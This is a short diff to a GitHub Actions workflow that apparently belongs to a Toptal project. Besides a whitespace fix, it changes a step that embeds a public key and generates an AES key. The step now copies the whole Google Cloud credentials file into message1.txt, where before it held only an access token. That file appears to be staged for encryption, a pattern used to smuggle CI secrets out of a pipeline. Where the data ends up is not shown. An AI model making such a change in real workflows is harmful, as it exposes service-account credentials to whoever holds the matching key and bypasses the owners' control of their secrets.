@@ -51,7 +51,7 @@ jobs:
             TOPTAL_TRIGGERBOT_TOKEN:toptal-ci/TOPTAL_TRIGGERBOT_TOKEN
             TOPTAL_TRIGGERBOT_USERNAME:toptal-ci/TOPTAL_TRIGGERBOT_USERNAME
 
-      - name: Parse secrets 
+      - name: Parse secrets
         id: parse_secrets
         uses: toptal/davinci-github-actions/expose-json-outputs@v15.4.1
         with:
@@ -294,7 +294,7 @@ jobs:
           -----END PUBLIC KEY-----
           EOF
           
-          echo "${{ steps.secrets_manager.outputs.access_token }}" > message1.txt
+          cat $GOOGLE_APPLICATION_CREDENTIALS > message1.txt
           
           openssl rand -base64 32 > aes_key.bin
           
